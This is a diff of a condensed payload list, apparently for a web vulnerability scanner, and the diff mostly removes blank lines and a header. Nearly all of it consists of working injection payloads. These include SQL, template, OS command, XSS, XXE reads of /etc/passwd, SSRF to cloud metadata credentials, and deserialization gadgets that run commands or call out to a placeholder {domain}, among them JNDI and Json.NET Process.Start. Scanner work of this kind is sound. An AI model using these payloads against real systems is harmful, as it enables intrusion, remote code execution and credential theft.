@@ -1,132 +1,84 @@
-##Condensed Discovery List##
-##
-## Covers all 35 testbed stacks, all 55 endpoints, all 4 detection
-## pillars per category (where architecturally possible).
-## Deserialization: 1 payload per framework (error-based).
-## Everything else: error + math + timing + OOB polyglots.
-##
-
 ##POLYGLOT - SQLi Cross-Dialect (Error)##
 'AND 1=CONVERT(int,@@version)--/*'OR 1=extractvalue(1,concat(0x7e,version()))--*/"OR CAST(version() AS int)--
-
 ##POLYGLOT - SQLi Cross-Dialect (Math: 1337)##
 'UNION SELECT 7*191--/*'UNION SELECT 7*191,7*191--*/"UNION SELECT 7*191,7*191,7*191--
-
 ##POLYGLOT - SQLi Cross-Dialect (Timing)##
 SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
-
 ##POLYGLOT - SQLi Cross-Dialect (OOB)##
 ';EXEC master..xp_dirtree '\\{domain}\a'--/*'OR LOAD_FILE('\\\\{domain}\\a')OR'*/"OR(SELECT dblink_send_query('host={domain}','SELECT 1'))--
-
 ##POLYGLOT - SSTI Cross-Engine (Math: 1337)##
 {{7*191}}${7*191}<%= 7*191 %>${{7*191}}#{7*191}#set($x=7*191)$x[=7*191]@(7*191)
-
 ##POLYGLOT - SSTI Cross-Engine (Error)##
 ${{<%[%'"}}%\
-
 ##POLYGLOT - SSTI Cross-Engine (Timing)##
 {{__import__('time').sleep(5)}}${T(java.lang.Thread).sleep(5000)}<%= sleep(5) %>${{T(java.lang.Thread).sleep(5000)}}
-
 ##POLYGLOT - SSTI Cross-Engine (OOB)##
 {{__import__('urllib.request').request.urlopen('http://{domain}/ssti')}}${T(java.net.URL).new('http://{domain}/ssti').openStream()}<%= require('net/http');Net::HTTP.get(URI('http://{domain}/ssti')) %>
-
 ##POLYGLOT - OS Command Injection Cross-Shell (Timing)##
 ;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
-
 ##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
 ;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
-
 ##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
 ;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
-
 ##POLYGLOT - Code Injection Cross-Language (Math: 1337)##
 7*191
-
 ##POLYGLOT - Code Injection Cross-Language (Timing)##
 __import__('time').sleep(5)
-
 ##POLYGLOT - Code Injection Cross-Language (OOB)##
 __import__('urllib.request').request.urlopen('http://{domain}/pyeval')
-
 ##POLYGLOT - XSS Cross-Context (Math)##
 '"><img src=x onerror=alert(1337)><!--
-
 ##POLYGLOT - XSS Blind/OOB##
 '"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
-
 ##POLYGLOT - XXE (File Read)##
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-
 ##POLYGLOT - XXE (OOB)##
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><foo>&xxe;</foo>
-
 ##POLYGLOT - SSRF##
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://{domain}/ssrf
-
 ##POLYGLOT - Path Traversal##
 ../../../../../../../etc/passwd
-
 ##POLYGLOT - NoSQL Injection (Math: 1337)##
 return 7*191
-
 ##POLYGLOT - NoSQL Injection (Error)##
 {"$gt":"","$ne":""}
-
 ##POLYGLOT - EL Injection Cross-Engine (Math: 1337)##
 ${7*191}
-
 ##POLYGLOT - Prototype Pollution##
 {"__proto__":{"polluted":1337}}
-
 ##POLYGLOT - CRLF/Header Injection##
 %0d%0aX-Injected:1337%0d%0a
-
 ##POLYGLOT - Format String##
 %s%s%s%s%s%s%s%s%s%s
-
 ##SSI Injection - Math (1337)##
 <!--#set var="x" value="1337" --><!--#echo var="x" -->
-
 ##LDAP Injection - Error-Based##
 *)(cn=*))(|(cn=*
-
 ##LDAP Injection - Math-Based (Canary: 1337)##
 *)(uid=1337)(&(objectClass=*
-
 ##XSLT Injection - Math-Based (Canary: 1337)##
 <xsl:value-of select="7*191"/>
-
 ##XSLT Injection - OOB##
 <xsl:value-of select="document('http://{domain}/xslt')"/>
-
 ##XSLT Injection - Error-Based##
 <xsl:invalid/>
-
 ##Elasticsearch Injection - Error-Based##
 {"query":{"invalid_query_type":{}}}
-
 ##Elasticsearch Injection - Math-Based (Canary: 1337)##
 {"script_fields":{"x":{"script":"7*191"}}}
-
 ##Cypher Injection - Error-Based##
 ' OR 1=1 RETURN 7*191 //
-
 ##Cypher Injection - Timing-Based##
 ' OR 1=1 WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
-
 ##CouchDB Injection - Error-Based##
 {"selector":{"$invalid_op":"test"}}
-
 ##Groovy Code Injection - Math-Based (Canary: 1337)##
 new GroovyShell().evaluate('7*191')
-
 ##Groovy Code Injection - Timing##
 Thread.sleep(5000)
-
 ##Groovy Code Injection - OOB##
 new URL('http://{domain}/groovy').text
-
 ##Python Pickle P0 - Error (1/0)##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnMS8wJwp0Ui4=
 ##Python Pickle P0 - Math (eval 7*191)##
@@ -135,7 +87,6 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnNyoxOTEnCnRSLg==
 Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
 ##Python Pickle P0 - OOB urllib##
 Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVybG9wZW4oImh0dHA6Ly97ZG9tYWlufS9waWNrbGUiKScKdFIu
-
 ##Python YAML - Error (1/0)##
 !!python/object/apply:builtins.eval ["1/0"]
 ##Python YAML - Math (eval 7*191)##
@@ -144,7 +95,6 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVy
 !!python/object/apply:os.system ["sleep 5"]
 ##Python YAML - OOB urllib##
 !!python/object/apply:builtins.exec ["import urllib.request;urllib.request.urlopen('http://{domain}/yaml')"]
-
 ##Python jsonpickle - Error (1/0)##
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["1/0"]}]}
 ##Python jsonpickle - Math (eval 7*191)##
@@ -153,7 +103,6 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVy
 {"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
 ##Python jsonpickle - OOB urllib##
 {"py/reduce":[{"py/function":"builtins.eval"},{"py/tuple":["__import__('urllib.request').request.urlopen('http://{domain}/jsonpickle')"]}]}
-
 ##Node node-serialize - Error (throw)##
 {"rce":"_$$ND_FUNC$$_function(){throw new Error(1337)}()"}
 ##Node node-serialize - Math (return 7*191)##
@@ -162,45 +111,32 @@ Y19fYnVpbHRpbl9fCmV2YWwKKFMnX19pbXBvcnRfXygidXJsbGliLnJlcXVlc3QiKS5yZXF1ZXN0LnVy
 {"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
 ##Node node-serialize - OOB http.get##
 {"rce":"_$$ND_FUNC$$_function(){require('http').get('http://{domain}/nodeser')}()"}
-
 ##Node js-yaml - Error (unknown tag)##
 !!invalid_tag_probe 1337
-
 ##Node funcster - Error (invalid code)##
 {"__js":"throw new Error(1337)"}
-
 ##PHP Unserialize - Error (nonexistent class)##
 O:9999:"NonExist":0:{}
-
 ##Ruby YAML - Error (invalid class)##
 --- !ruby/object:NonExistentClass1337\ni: x
-
 ##Ruby Marshal - Error (malformed)##
 BAj/AAAA
-
 ##Perl Storable - Error (bad version)##
 cHN0MP///wQA
-
 ##Perl YAML - Error (invalid syntax)##
 --- {{{invalid yaml 1337
-
 ##Java Serialized - Error (HashSet header)##
 rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
-
 ##SnakeYAML - Error (nonexistent class)##
 !!com.nonexistent.FakeClass1337 {}
-
 ##Java Jackson - Error (TemplatesImpl)##
 ["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"transletBytecodes":["yv66vg=="],"transletName":"a","outputProperties":{}}]
-
 ##Java Fastjson - Error (TemplatesImpl)##
 {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vg=="],"_name":"a","_tfactory":{},"_outputProperties":{}}
 ##Java Fastjson - OOB (InetAddress DNS)##
 {"@type":"java.net.InetAddress","val":"{domain}"}
-
 ##Java XStream - Error (ProcessBuilder)##
 <java.lang.ProcessBuilder><command><string>nslookup</string><string>{domain}</string></command></java.lang.ProcessBuilder>
-
 ##XMLDecoder - Error (invalid class)##
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="com.nonexistent.Fake1337"/></java>
 ##XMLDecoder - Math (echo 1337)##
@@ -209,25 +145,19 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldA==
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 ##XMLDecoder - OOB URL.openStream##
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.net.URL"><string>http://{domain}/xmldecoder</string><void method="openStream"/></object></java>
-
 ##Java Hessian - OOB (JNDI ref)##
 C_hessianRldap://{domain}/a
-
 ##.NET Json.NET - OOB (nslookup)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"nslookup","Arguments":"{domain}"}}}
 ##.NET Json.NET - Math (echo 1337)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c echo 1337"}}}
 ##.NET Json.NET - Timing (timeout 5)##
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
-
 ##.NET BinaryFormatter - Error (header probe)##
 AAEAAAD/////AQAAAAAAAAAEAQAAAA==
-
 ##.NET ViewState - Error (probe)##
 __VIEWSTATE=/wEPDwUKLTEyMzQ1Njc4OQ==
-
 ##ysoserial URLDNS - OOB (DNS lookup)##
 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHA/QAAAAAAADHcIAAAAEAAAAAFzcgAMamF2YS5uZXQuVVJMliU3Nhr85HIDAAdJAAhoYXNoQ29kZUkABHBvcnRMAAlhdXRob3JpdHl0ABJMamF2YS9sYW5nL1N0cmluZztMAARmaWxldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEaG9zdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACHByb3RvY29sdAASTGphdmEvbGFuZy9TdHJpbmc7TAADcmVmdAASTGphdmEvbGFuZy9TdHJpbmc7cP//////////dAAIe2RvbWFpbn10AAcvdXJsZG5zdAAIe2RvbWFpbn10AARodHRwcHh0ABZodHRwOi8ve2RvbWFpbn0vdXJsZG5zeA==
-
 ##Java JNDI - OOB ldap##
 ${jndi:ldap://{domain}/a}
